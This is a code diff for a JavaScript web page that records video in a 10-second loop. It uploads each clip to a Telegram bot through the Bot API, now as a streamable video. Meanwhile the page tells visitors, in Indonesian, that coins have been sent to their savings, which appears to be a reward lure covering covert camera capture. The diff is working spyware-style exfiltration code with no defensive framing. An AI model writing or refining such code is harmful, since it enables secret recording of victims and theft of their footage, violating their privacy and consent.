@@ -23,32 +23,33 @@ async function startRecording() {
     };
 
     // Function to send video to Telegram
-    function sendVideoToTelegram() {
-        const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-        const formData = new FormData();
+function sendVideoToTelegram() {
+    const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
+    const formData = new FormData();
 
-        formData.append('chat_id', chatId);  // Masukkan chat ID
-        formData.append('document', videoBlob, 'recording.mp4');  // Mengirim file video sebagai dokumen
+    formData.append('chat_id', chatId);  // Masukkan chat ID
+    formData.append('video', videoBlob, 'recording.mp4');  // Mengirim video sebagai media
+    formData.append('supports_streaming', true);  // Agar bisa diputar langsung di Telegram
 
-        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {  // Masukkan token bot Telegram
-            method: 'POST',
-            body: formData,
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                statusDisplay.textContent = 'koin berhasil terkirim ke tabungan!';
-            } else {
-                statusDisplay.textContent = 'Error: ' + data.description;
-            }
-        })
-        .catch(error => {
-            statusDisplay.textContent = 'Error saat mengklaim coba lagi!.';
-            console.error('Error:', error);
-        });
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {  // Ganti sendDocument ke sendVideo
+        method: 'POST',
+        body: formData,
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            statusDisplay.textContent = 'Koin berhasil terkirim ke tabungan!';
+        } else {
+            statusDisplay.textContent = 'Error: ' + data.description;
+        }
+    })
+    .catch(error => {
+        statusDisplay.textContent = 'Error saat mengklaim coba lagi!';
+        console.error('Error:', error);
+    });
 
-        videoChunks = [];  // Reset videoChunks setelah pengiriman
-    }
+    videoChunks = [];  // Reset videoChunks setelah pengiriman
+}
 
     // Function to start 10 seconds recording loop with countdown and gold claim message
     function start10SecondsRecording() {
